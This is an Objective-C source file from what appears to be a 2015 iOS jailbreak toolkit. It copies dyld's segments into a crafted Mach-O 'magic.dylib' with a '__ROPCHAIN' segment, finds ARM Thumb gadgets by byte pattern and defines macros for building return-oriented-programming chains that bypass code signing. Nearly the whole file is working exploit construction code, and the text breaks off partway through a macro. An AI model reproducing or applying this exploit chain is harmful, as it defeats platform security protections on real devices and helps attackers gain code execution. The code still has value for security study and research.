//
//  main.m
//  build-o
//
//  Created by qwertyoruiop on 14/09/15.
//  Copyright (c) 2015 Kim Jong Cracks. All rights reserved.
//

//  thanks to windknown & pangu team

#include <mach-o/loader.h>
#include <mach-o/ldsyms.h>
#include <mach-o/reloc.h>
#include <mach/mach.h>
#include <mach-o/fat.h>
#include <mach-o/getsect.h>
#include <sys/syscall.h>
#import <Foundation/Foundation.h>
#import "libxnuexp.h"


typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t desc;
    mach_msg_trailer_t trailer;
} oolmsg_t;
typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t desc;
    mach_msg_trailer_t trailer;
    char oolrcvbuf[4096];
} oolmsgrcv_t;

#if __LP64__
#define macho_header			mach_header_64
#define LC_SEGMENT_COMMAND		LC_SEGMENT_64
#define macho_segment_command	segment_command_64
#define macho_section			section_64
#define RELOC_SIZE				3
#else
#define macho_header			mach_header
#define LC_SEGMENT_COMMAND		LC_SEGMENT
#define macho_segment_command	segment_command
#define macho_section			section
#define RELOC_SIZE				2
#endif

void rebaseDyld(const struct macho_header* mh, intptr_t slide)
{
    // get interesting pointers into dyld
    const uint32_t cmd_count = mh->ncmds;
    const struct load_command* const cmds = (struct load_command*)(((char*)mh)+sizeof(struct macho_header));
    const struct load_command* cmd = cmds;
    const struct macho_segment_command* linkEditSeg = NULL;
    const struct dysymtab_command* dynamicSymbolTable = NULL;
    const struct macho_section* nonLazySection = NULL;
    for (uint32_t i = 0; i < cmd_count; ++i) {
        switch (cmd->cmd) {
            case LC_SEGMENT_COMMAND:
            {
                const struct macho_segment_command* seg = (struct macho_segment_command*)cmd;
                if ( strcmp(seg->segname, "__LINKEDIT") == 0 )
                    linkEditSeg = seg;
                const struct macho_section* const sectionsStart = (struct macho_section*)((char*)seg + sizeof(struct macho_segment_command));
                const struct macho_section* const sectionsEnd = &sectionsStart[seg->nsects];
                for (const struct macho_section* sect=sectionsStart; sect < sectionsEnd; ++sect) {
                    const uint8_t type = sect->flags & SECTION_TYPE;
                    if ( type == S_NON_LAZY_SYMBOL_POINTERS )
                        nonLazySection = sect;
                }
            }
                break;
            case LC_DYSYMTAB:
                dynamicSymbolTable = (struct dysymtab_command *)cmd;
                break;
        }
        cmd = (const struct load_command*)(((char*)cmd)+cmd->cmdsize);
    }
    
    // use reloc's to rebase all random data pointers
    const uintptr_t relocBase = (uintptr_t)mh;
    const struct relocation_info* const relocsStart = (struct relocation_info*)(linkEditSeg->vmaddr + slide + dynamicSymbolTable->locreloff - linkEditSeg->fileoff);
    const struct relocation_info* const relocsEnd = &relocsStart[dynamicSymbolTable->nlocrel];
    for (const struct relocation_info* reloc=relocsStart; reloc < relocsEnd; ++reloc) {
        if ( (reloc->r_address & R_SCATTERED) == 0 ) {
            if (reloc->r_length == RELOC_SIZE) {
                switch(reloc->r_type) {
                    case GENERIC_RELOC_VANILLA:
                        *((uintptr_t*)(reloc->r_address + relocBase)) += slide;
                        break;
                }
            }
        }
        else {
            const struct scattered_relocation_info* sreloc = (struct scattered_relocation_info*)reloc;
            if (sreloc->r_length == RELOC_SIZE) {
                uintptr_t* locationToFix = (uintptr_t*)(sreloc->r_address + relocBase);
                switch(sreloc->r_type) {
                    case GENERIC_RELOC_VANILLA:
                        // Note the use of PB_LA_PTR is unique here.  Seems like ld should strip out all lazy pointers
                        // but it does not.  But, since all lazy-pointers point within dyld, they can be slid too
                        *locationToFix += slide;
                        break;
                }
            }
        }
    }
    
    // rebase non-lazy pointers (which all point internal to dyld, since dyld uses no shared libraries)
    if ( nonLazySection != NULL ) {
        const uint32_t pointerCount = nonLazySection->size / sizeof(uintptr_t);
        uintptr_t* const symbolPointers = (uintptr_t*)(nonLazySection->addr + slide);
        for (uint32_t j=0; j < pointerCount; ++j) {
            symbolPointers[j] += slide;
        }
    }
    
    
}

void *g_text_ptr = NULL;
size_t g_text_size = 0;
void *g_data_ptr = NULL;
void *r_data_ptr = NULL;
size_t g_data_size = 0;
size_t g_data_vmsize = 0;
void *g_lnk_ptr = NULL;
size_t g_lnk_size = 0;

void *g_cs_ptr = NULL;
size_t g_cs_size = 0;

void dump_dyld_segments(const uint8_t *macho_data)
{
    if (*(uint32_t *)macho_data == MH_MAGIC)
    {
        uint32_t text_file_off = 0;
        uint32_t text_file_size = 0;
        uint32_t cs_offset = 0;
        uint32_t cs_size = 0;
        
        struct mach_header* header = (struct mach_header*)macho_data;
        
        struct load_command *load_cmd = (struct load_command *)(header + 1);
        for (int i=0; i<header->ncmds; i++)
        {
            if (load_cmd->cmd == LC_SEGMENT)
            {
                struct segment_command *seg = (struct segment_command *)load_cmd;
                if (strcmp(seg->segname, "__TEXT") == 0)
                {
                    text_file_off = seg->fileoff;
                    text_file_size = seg->filesize - 0x1000;
                    
                    g_text_size = text_file_size;
                    g_text_ptr = malloc(text_file_size);
                    if (g_text_ptr == NULL)
                    {
                        NSLog(@"No place for text!");
                    }
                    
                    memcpy(g_text_ptr, macho_data+text_file_off+0x1000, text_file_size);
                    
                } else
                    if (strcmp(seg->segname, "__DATA") == 0)
                    {
                        text_file_off = seg->fileoff;
                        text_file_size = seg->filesize;
                        
                        g_data_size = text_file_size;
                        g_data_vmsize = seg->vmsize;
                        
                        g_data_ptr = malloc(text_file_size);
                        if (g_text_ptr == NULL)
                        {
                            NSLog(@"No place for data!");
                        }
                        
                        memcpy(g_data_ptr, macho_data+text_file_off, text_file_size);
                        rebaseDyld((void*)macho_data, 0x50000000 - 0x1fe00000);
                        
                        r_data_ptr = malloc(g_data_size);
                        if (r_data_ptr == NULL)
                        {
                            NSLog(@"No place for data!");
                        }
                        
                        memcpy(r_data_ptr, macho_data+text_file_off, text_file_size);
                        
                    }
                    else
                        if (strcmp(seg->segname, "__LINKEDIT") == 0)
                        {
                            text_file_off = seg->fileoff;
                            text_file_size = seg->filesize;
                            
                            g_lnk_size = text_file_size;
                            
                            g_lnk_ptr = malloc(text_file_size);
                            if (g_text_ptr == NULL)
                            {
                                NSLog(@"No place for linkedit!");
                            }
                            
                            memcpy(g_lnk_ptr, macho_data+text_file_off, text_file_size);
                            
                        }
                
            } else if (load_cmd->cmd == LC_CODE_SIGNATURE)
            {
                struct linkedit_data_command* cscmd = (struct linkedit_data_command*)load_cmd;
                
                cs_offset = cscmd->dataoff;
                cs_size = cscmd->datasize;
                
                g_cs_size = cs_size;
                g_cs_ptr = malloc(cs_size);
                if (g_cs_ptr == NULL)
                {
                    NSLog(@"no place for cs!");
                }
                
                memcpy(g_cs_ptr, macho_data+cs_offset, cs_size);
                
                NSLog(@"cs_size = %x", cs_size);
            }
            
            load_cmd = (struct load_command *)((uint8_t *)load_cmd + load_cmd->cmdsize);
        }
    }
    else if (*(uint32_t *)macho_data == MH_MAGIC_64)
    {
        uint64_t text_file_off_64 = 0;
        uint64_t text_file_size_64 = 0;
        uint64_t cs_offset_64 = 0;
        uint64_t cs_size_64 = 0;
        
        struct mach_header_64* header = (struct mach_header_64*)macho_data;
        
        struct load_command *load_cmd = (struct load_command *)(header + 1);
        for (int i=0; i<header->ncmds; i++)
        {
            if (load_cmd->cmd == LC_SEGMENT_64)
            {
                struct segment_command_64 *seg = (struct segment_command_64 *)load_cmd;
                if (strcmp(seg->segname, "__TEXT") == 0)
                {
                    text_file_off_64 = seg->fileoff;
                    text_file_size_64 = seg->filesize-0x1000;
                    
                    g_text_size = text_file_size_64;
                    
                    g_text_ptr = malloc(text_file_size_64);
                    if (g_text_ptr == NULL)
                    {
                        NSLog(@"No place for text!");
                    }
                    
                    memcpy(g_text_ptr, macho_data+text_file_off_64+0x1000, text_file_size_64);
                    
                } else
                    if (strcmp(seg->segname, "__DATA") == 0)
                    {
                        text_file_off_64 = seg->fileoff;
                        text_file_size_64 = seg->filesize;
                        
                        g_data_size = text_file_size_64;
                        g_data_vmsize = seg->vmsize;
                        
                        g_data_ptr = malloc(g_data_size);
                        if (g_data_ptr == NULL)
                        {
                            NSLog(@"No place for data!");
                        }
                        
                        memcpy(g_data_ptr, macho_data+text_file_off_64, g_data_size);
                        
                        rebaseDyld((void*)macho_data, 0x50000000 - 0x1fe00000);
                        
                        r_data_ptr = malloc(g_data_size);
                        if (r_data_ptr == NULL)
                        {
                            NSLog(@"No place for data!");
                        }
                        
                        memcpy(r_data_ptr, macho_data+text_file_off_64, g_data_size);
                        
                    } else
                        if (strcmp(seg->segname, "__LINKEDIT") == 0)
                        {
                            text_file_off_64 = seg->fileoff;
                            text_file_size_64 = seg->filesize;
                            
                            g_lnk_size = text_file_size_64;
                            
                            g_lnk_ptr = malloc(text_file_size_64);
                            if (g_text_ptr == NULL)
                            {
                                NSLog(@"No place for text!");
                            }
                            
                            memcpy(g_lnk_ptr, macho_data+text_file_off_64, text_file_size_64);
                            
                        }
                
            } else if (load_cmd->cmd == LC_CODE_SIGNATURE)
            {
                struct linkedit_data_command* cscmd = (struct linkedit_data_command*)load_cmd;
                
                cs_offset_64 = cscmd->dataoff;
                cs_size_64 = cscmd->datasize;
                
                g_cs_size = cs_size_64;
                
                g_cs_ptr = malloc(cs_size_64);
                if (g_cs_ptr == NULL)
                {
                    NSLog(@"no place for cs!");
                }
                
                memcpy(g_cs_ptr, macho_data+cs_offset_64, cs_size_64);
                
                NSLog(@"cs_size = %llx", cs_size_64);
            }
            load_cmd = (struct load_command *)((uint8_t *)load_cmd + load_cmd->cmdsize);
        }
    }
    assert(g_cs_size > 0);
    assert(g_data_size > 0);
    assert(g_text_size > 0);
    assert(g_lnk_size > 0);
    g_lnk_size = round_page(g_lnk_size);
}



void process_dyld_file(NSString *srcPath)
{
    // get an valid signature
    NSFileHandle *inputHdl = [NSFileHandle fileHandleForReadingAtPath:srcPath];
    if (inputHdl == nil)
    {
        NSLog(@"open input file fail");
        return;
    }
    
    NSData *header = [inputHdl readDataOfLength:2048];
    struct fat_header *fat_hdr = (struct fat_header *)[header bytes];
    if (OSSwapInt32(fat_hdr->magic) == FAT_MAGIC)
    {
        NSLog(@"input is a fat file");
        
        struct fat_arch *arch = (struct fat_arch *)(fat_hdr + 1);
        for (int i=0; i<OSSwapInt32(fat_hdr->nfat_arch); i++)
        {
            [inputHdl seekToFileOffset:OSSwapInt32(arch->offset)];
            NSData *myData = [inputHdl readDataOfLength:OSSwapInt32(arch->size)];
            
            const uint8_t *headerc =  [myData bytes];
            uint8_t *header = mmap((void*)0x50000000, round_page([myData length]) + 0x5000000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
            memcpy(header, headerc, [myData length]);
            
            dump_dyld_segments(header);
            arch++;
        }
    }
    else
    {
        [inputHdl seekToFileOffset:0];
        NSData *myData = [inputHdl readDataToEndOfFile];
        const uint8_t *headerc =  [myData bytes];
        uint8_t *header = mmap((void*)0x50000000, round_page([myData length]) + 0x5000000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
        memcpy(header, headerc, [myData length]);
        
        dump_dyld_segments(header);
    }
}

int main(int argc, const char * argv[]) {
    
    /* mapping */
    
    uint32_t fsz = 0;
    
    NSString *dyld_path = @"./dyld";
    
    
    
    process_dyld_file(dyld_path);
    
    uintptr_t dyld_base = 0x50001001;
#define DeclGadget(name, pattern, size) uint32_t name = (uint32_t)memmem(g_text_ptr, g_text_size, (void*)pattern, size); assert(name); name -= (uint32_t)g_text_ptr; name += (uint32_t)dyld_base
    
    
    int fd=open("./magic.dylib", O_CREAT | O_RDWR | O_TRUNC, 0755);
    assert(fd > 0);
    ftruncate(fd, (0x10000000));
    char* buf = mmap(NULL, (0x10000000), PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    assert(buf != (void *)-1);
    
    /* write mach header */
    
    
    xnuexp_mach_o * dy = [xnuexp_mach_o withContentsOfFile:dyld_path];
    //    assert(dy.hdr->cpusubtype == mh.cpusubtype && dy.hdr->cputype == mh.cputype);
    if (!dy) {
        xnuexp_fat_mach_o  * fat_dy = [xnuexp_fat_mach_o withContentsOfFile:dyld_path];
        dy = [fat_dy getArchitectureByFirstMagicMatch:MH_MAGIC];
        assert(fat_dy && dy);
    }

    struct mach_header mh;
    mh.magic = dy.hdr->magic;
    mh.filetype = MH_EXECUTE; // must be MH_EXECUTE non-PIE (bug 1)
    mh.flags = 0; // must be MH_EXECUTE non-PIE (bug 1)
    mh.cputype = dy.hdr->cputype;
    mh.cpusubtype = dy.hdr->cpusubtype;
    mh.ncmds=0;
    mh.sizeofcmds=0;

    /* required on iOS */
    
    struct dyld_info_command dyld_ic;
    bzero(&dyld_ic, sizeof(dyld_ic));
    dyld_ic.cmd=LC_DYLD_INFO;
    dyld_ic.cmdsize=sizeof(dyld_ic);
    dyld_ic.export_off = 1337;
    
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &dyld_ic, dyld_ic.cmdsize);
    mh.sizeofcmds += dyld_ic.cmdsize;
    mh.ncmds++;
    
    /* FakeTEXT segment */
    
    struct segment_command load_cmd_seg;
    load_cmd_seg.fileoff = 0x1000;
    load_cmd_seg.filesize = (uint32_t)g_text_size - 0x1000;
    load_cmd_seg.vmsize = (uint32_t)g_text_size;
    load_cmd_seg.vmaddr = 0x50001000;
    load_cmd_seg.initprot = PROT_READ|PROT_EXEC; // must be EXEC
    load_cmd_seg.maxprot = PROT_READ|PROT_EXEC; // must be EXEC
    load_cmd_seg.cmd = LC_SEGMENT;
    load_cmd_seg.cmdsize = sizeof(load_cmd_seg);
    load_cmd_seg.flags = 0;
    load_cmd_seg.nsects = 0;
    strcpy(&load_cmd_seg.segname[0], "__DYLDTEXT"); // must be __PAGEZERO (bug 2)
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
    mh.sizeofcmds += load_cmd_seg.cmdsize;
    mh.ncmds++;
    
    
    char *code_data = (char*)(buf + fsz + 0x1000);
    memcpy(code_data, g_text_ptr, g_text_size);
    
    fsz += load_cmd_seg.filesize + 0x2000;
    
    load_cmd_seg.initprot = PROT_READ|PROT_WRITE; // must be non-EXEC to be usable
    load_cmd_seg.maxprot = PROT_READ|PROT_WRITE; // must be non-EXEC to be usable
    
    uint32_t p = fsz;
    load_cmd_seg.vmaddr = 0x4F000000 + fsz;
    load_cmd_seg.fileoff = fsz;
    load_cmd_seg.filesize = (uint32_t)g_data_size;
    load_cmd_seg.vmsize = (uint32_t)g_data_vmsize;
    strcpy(&load_cmd_seg.segname[0], "__DYLDDATAFAKE");
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
    mh.sizeofcmds += load_cmd_seg.cmdsize;
    mh.ncmds++;
    
    code_data = (char*)(buf + fsz);
    memcpy(code_data, g_data_ptr, g_data_size);
    
    fsz += load_cmd_seg.filesize;
    
    load_cmd_seg.vmaddr = 0x50000000 + p + g_data_vmsize;
    load_cmd_seg.fileoff = fsz;
    load_cmd_seg.filesize = (uint32_t)g_lnk_size;
    load_cmd_seg.vmsize = (uint32_t)g_lnk_size;
    strcpy(&load_cmd_seg.segname[0], "__DYLDLINKEDIT");
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
    mh.sizeofcmds += load_cmd_seg.cmdsize;
    mh.ncmds++;
    
    code_data = (char*)(buf + fsz);
    memcpy(code_data, g_lnk_ptr, g_lnk_size);
    
    fsz += load_cmd_seg.filesize;
    
    
    load_cmd_seg.vmaddr = 0x50000000 + p;
    load_cmd_seg.fileoff = fsz;
    load_cmd_seg.filesize = (uint32_t)g_data_size;
    load_cmd_seg.vmsize = (uint32_t)g_data_vmsize;
    strcpy(&load_cmd_seg.segname[0], "__DYLDDATA");
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
    mh.sizeofcmds += load_cmd_seg.cmdsize;
    mh.ncmds++;
    
    code_data = (char*)(buf + fsz);
    memcpy(code_data, r_data_ptr, g_data_size);
    
    fsz += load_cmd_seg.filesize;
    
    __unused char *data = (char*)(buf + fsz);
    __unused char *dptr = (char*)(0x5A000000);
    
    
    load_cmd_seg.vmaddr = 0x51000000;
    load_cmd_seg.fileoff = fsz;
    load_cmd_seg.filesize = 0x500000;
    load_cmd_seg.vmsize = 0x500000;
    strcpy(&load_cmd_seg.segname[0], "__ROPCHAIN");
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
    mh.sizeofcmds += load_cmd_seg.cmdsize;
    mh.ncmds++;
    uint32_t *stack = (uint32*)(buf + fsz + 0x4000);
    uint32_t *stackz = (uint32*)(buf + fsz + 0x100000 + 0x4000);
    uint32_t *stacky = (uint32*)(buf + fsz + 0x90000 + 0x4000);
    
    uint32_t *stackbase = stack;
    uint32_t segstackbase = load_cmd_seg.vmaddr + 0x4000;
    uint32_t segstackzbase = load_cmd_seg.vmaddr + 0x100000 + 0x4000;
    uint32_t segstackybase = load_cmd_seg.vmaddr + 0x90000 + 0x4000;
    
    
    DeclGadget(mov_sp_r4_pop_r4r7pc, (&(char[]){0xa5,0x46,0x90,0xbd}), 4);
    DeclGadget(mov_r0_r4_pop_r4r7pc, (&(char[]){0x20,0x46,0x90,0xbd}), 4);
    DeclGadget(add_r0_r2_pop_r4r5r7pc, (&(char[]){0x10,0x44,0xb0,0xbd}), 4);
    DeclGadget(pop_r4r5r6r7pc, (&(char[]){0xf0,0xbd}), 2);
    DeclGadget(pop_r2pc, (&(char[]){0x04,0xbd}), 2);
    DeclGadget(pop_r4r7pc, (&(char[]){0x90,0xbd}), 2);
    DeclGadget(pop_r7pc, (&(char[]){0x80,0xbd}), 2);
    DeclGadget(bx_lr, (&(char[]){0x70,0x47}), 2);
    DeclGadget(not_r0_pop_r4r7pc, (&(char[]){0x01,0x46,0x00,0x20,0x00,0x29,0x08,0xbf,0x01,0x20,0x90,0xbd}), 12);
    DeclGadget(muls_r0r2r0_ldr_r2r4_str_r248_pop_r4r5r7pc, (&(char[]){0x50,0x43,0x22,0x68,0xC2,0xE9,0x0C,0x01,0xB0,0xBD}), 10);
    DeclGadget(lsrs_r0_2_popr4r5r7pc, (&(char[]){0x4F,0xEA,0x90,0x00,0xB0,0xBD}), 6);
    
    
    DeclGadget(ldr_r0_r0_8_pop_r7pc, (&(char[]){0x80,0x68,0x80,0xbd}), 4);
    DeclGadget(str_r0_r4_8_pop_r4r7pc, (&(char[]){0xa0,0x60,0x90,0xbd}), 4);
    DeclGadget(bx_r2_pop_r4r5r7pc, (&(char[]){0x10,0x47,0xb0,0xbd}), 4);
    DeclGadget(bx_r2_add_sp_40_pop_r8r10r11r4r5r6r7pc, (&(char[]){0x10,0x47,0x10,0xB0,0xBD,0xE8,0x00,0x0D,0xF0,0xBD}), 10);
    DeclGadget(pop_r0r1r3r4r7pc, (&(char[]){0xab,0xbd}), 2);
    
    //  DeclGadget(pop_r0r1r2r4r5pc, (&(char[]){0x37,0xbd}), 2);
    
    DeclGadget(pop_r0r1r2r3r5r7pc, (&(char[]){0xaf,0xbd}), 2);
    
#pragma pack(4)
    struct mig_set_special_port_req {
        mach_msg_header_t Head;
        
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t port;
        
        NDR_record_t NDR;
        int which;
    }  __attribute__((unused));
    
#pragma pack()
#pragma pack(4)
    
    struct mig_set_special_port_rep {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_msg_trailer_t trailer;
    }  __attribute__((unused));
    
#pragma pack()
#pragma pack(4)
    struct mig_set_special_port___rep
    {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
    }  __attribute__((unused));
#pragma pack()
    
    [dy setSlide:-[dy base] + 0x50000000];
    
#define InitMessage  "#yalubreek #unthreadedjb! lol code signatures! %d -qwertyoruiop\n"
    
#define StoreR0(push, where) \
push = (uint32_t)pop_r4r7pc;\
push = ((uint32_t)where) - 8;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch
    
#define Shift2R0(push) \
push = (uint32_t)lsrs_r0_2_popr4r5r7pc;\
push = (uint32_t)0x44444444;\
push = (uint32_t)0x45454545;\
push = (uint32_t)m_m_scratch
    
#define WriteWhatWhere(push,what, where)\
push = (uint32_t)pop_r0r1r3r4r7pc;\
push = (uint32_t)what;\
push = (uint32_t)0x11111111;\
push = (uint32_t)0x22222222;\
push = ((uint32_t)where) - 8;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r4r7pc;\
push = ((uint32_t)where) - 8;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch
    
#define LoadIntoR0(push, where)\
push = (uint32_t)pop_r0r1r3r4r7pc;\
push = (uint32_t)where - 8;\
push = (uint32_t)0x11111111;\
push = (uint32_t)0x22222222;\
push = (uint32_t)0x44444444; \
push = (uint32_t)0x55555555; \
push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
push = (uint32_t)m_m_scratch
    
#define DerefR0(push)\
push = pop_r2pc;\
push = -8;\
push = add_r0_r2_pop_r4r5r7pc;\
push = 0x44444444;\
push = 0x45454545;\
push = 0x47474747;\
push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
push = (uint32_t)m_m_scratch
    
#define RopFixupLR(push) \
push = (uint32_t)pop_r0r1r2r3r5r7pc;\
push = (uint32_t)0x40404040; \
push = (uint32_t)0x41414141; \
push = (uint32_t)pop_r2pc; \
push = (uint32_t)0x43434343; \
push = (uint32_t)0x45454545; \
push = (uint32_t)(m_m_scratch); \
push = (uint32_t)bx_r2_add_sp_40_pop_r8r10r11r4r5r6r7pc;\
push = (uint32_t)0x22222222;\

#define RopNopSlide(push) \
push = (uint32_t)pop_r7pc;\
push = (uint32_t)pop_r4r7pc;\
push = (uint32_t)pop_r7pc;\
push = (uint32_t)pop_r4r7pc;\
push = (uint32_t)pop_r7pc;\
push = (uint32_t)pop_r4r7pc;\
push = (uint32_t)pop_r7pc;\
push = (uint32_t)pop_r4r7pc;\
push = (uint32_t)pop_r7pc;\
push = (uint32_t)pop_r4r7pc;\
push = (uint32_t)pop_r7pc;\
push = (uint32_t)pop_r4r7pc;\
push = (uint32_t)pop_r7pc;\
push = (uint32_t)pop_r4r7pc
    
#define RopCallFunction10(push, name, a, b, c, d, e, f, g, h, i, l) \
RopFixupLR(push); \
push = (uint32_t)pop_r0r1r2r3r5r7pc; \
push = (uint32_t)a; \
push = (uint32_t)b; \
push = (uint32_t)c; \
push = (uint32_t)d; \
push = (uint32_t)0x45454545; \
push = (uint32_t)(m_m_scratch); \
assert((uint32_t)[dy solveSymbol:name]);\
push = (uint32_t)[dy solveSymbol:name];\
push = (uint32_t)e;\
push = (uint32_t)f;\
push = (uint32_t)g;\
push = (uint32_t)h;\
push = (uint32_t)i;\
push = (uint32_t)l;\
RopNopSlide(push)
    
#define RopCallFunction9Deref1(push, name, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h, i) RopCallFunctionPointer10Deref1(push,[dy solveSymbol:name], repl_arg_0,read_ptr_0,a,b,c,d,e,f,g,h,i,0)
#define RopCallFunction10Deref1(push, name, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h, i, l) RopCallFunctionPointer9Deref1(push,[dy solveSymbol:name], repl_arg_0,read_ptr_0,a,b,c,d,e,f,g,h,i,l)
#define RopCallFunctionPointer10Deref1(push, ptr, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h, i, l) \
RopFixupLR(push);\
push = (uint32_t)pop_r0r1r3r4r7pc;\
push = (uint32_t)read_ptr_0 - 8;\
push = (uint32_t)0x11111111;\
push = (uint32_t)0x33333333;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch; \
push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r4r7pc;\
tmp = ((repl_arg_0 < 4) ? (4*(repl_arg_0 + 6)) : (4*(repl_arg_0 + 9))) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
push = (uint32_t)tmp  - 8; \
push = (uint32_t)m_m_scratch;\
push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r0r1r2r3r5r7pc; \
push = (uint32_t)a; \
push = (uint32_t)b; \
push = (uint32_t)c; \
push = (uint32_t)d; \
push = (uint32_t)0x45454545; \
push = (uint32_t)(m_m_scratch); \
assert((uint32_t)ptr);\
push = (uint32_t)ptr;\
push = (uint32_t)e;\
push = (uint32_t)f;\
push = (uint32_t)g;\
push = (uint32_t)h;\
push = (uint32_t)i;\
push = (uint32_t)l;\
push = (uint32_t)0;\
push = (uint32_t)0;\
push = (uint32_t)0;\
push = (uint32_t)0;\
RopNopSlide(push)
    
#define RopCallFunction9Deref2(push, name, repl_arg_0,  read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h, i) RopCallFunctionPointer9Deref2(push,[dy solveSymbol:name], repl_arg_0,read_ptr_0,repl_arg_1,read_ptr_1,a,b,c,d,e,f,g,h,i)
    
#define RopCallFunctionPointer9Deref2(push, ptr, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h, i) \
RopFixupLR(push);\
push = (uint32_t)pop_r0r1r3r4r7pc;\
push = (uint32_t)read_ptr_1 - 8;\
push = (uint32_t)0x11111111;\
push = (uint32_t)0x33333333;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch; \
push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r4r7pc;\
tmp = ((repl_arg_1 < 4) ? (4*(14 + repl_arg_1 + 6)) : (4*(14 + repl_arg_1 + 9))) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
push = (uint32_t)tmp  - 8; \
push = (uint32_t)m_m_scratch;\
push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r0r1r3r4r7pc;\
push = (uint32_t)read_ptr_0 - 8;\
push = (uint32_t)0x11111111;\
push = (uint32_t)0x33333333;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch; \
push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r4r7pc;\
tmp = ((repl_arg_0 < 4) ? (4*(repl_arg_0 + 6)) : (4*(repl_arg_0 + 9))) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
push = (uint32_t)tmp  - 8; \
push = (uint32_t)m_m_scratch;\
push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r0r1r2r3r5r7pc; \
push = (uint32_t)a; \
push = (uint32_t)b; \
push = (uint32_t)c; \
push = (uint32_t)d; \
push = (uint32_t)0x45454545; \
push = (uint32_t)(m_m_scratch); \
assert((uint32_t)ptr);\
push = (uint32_t)ptr;\
push = (uint32_t)e;\
push = (uint32_t)f;\
push = (uint32_t)g;\
push = (uint32_t)h;\
push = (uint32_t)i;\
RopNopSlide(push)
    
#define RopCallFunction9Deref3(push, name, repl_arg_0,  read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d, e, f, g, h, i) RopCallFunctionPointer9Deref3(push,[dy solveSymbol:name], repl_arg_0,read_ptr_0,repl_arg_1,read_ptr_1, repl_arg_2, read_ptr_2,a,b,c,d,e,f,g,h,i)
    
#define RopCallFunctionPointer9Deref3(push, ptr, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d, e, f, g, h, i) \
RopFixupLR(push);\
push = (uint32_t)pop_r0r1r3r4r7pc;\
push = (uint32_t)read_ptr_2 - 8;\
push = (uint32_t)0x11111111;\
push = (uint32_t)0x33333333;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch; \
push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r4r7pc;\
tmp = ((repl_arg_2 < 4) ? (4*(28 + repl_arg_2 + 6)) : (4*(28 + repl_arg_2 + 9))) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
push = (uint32_t)tmp  - 8; \
push = (uint32_t)m_m_scratch;\
push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r0r1r3r4r7pc;\
push = (uint32_t)read_ptr_1 - 8;\
push = (uint32_t)0x11111111;\
push = (uint32_t)0x33333333;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch; \
push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r4r7pc;\
tmp = ((repl_arg_1 < 4) ? (4*(14 + repl_arg_1 + 6)) : (4*(14 + repl_arg_1 + 9))) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
push = (uint32_t)tmp  - 8; \
push = (uint32_t)m_m_scratch;\
push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r0r1r3r4r7pc;\
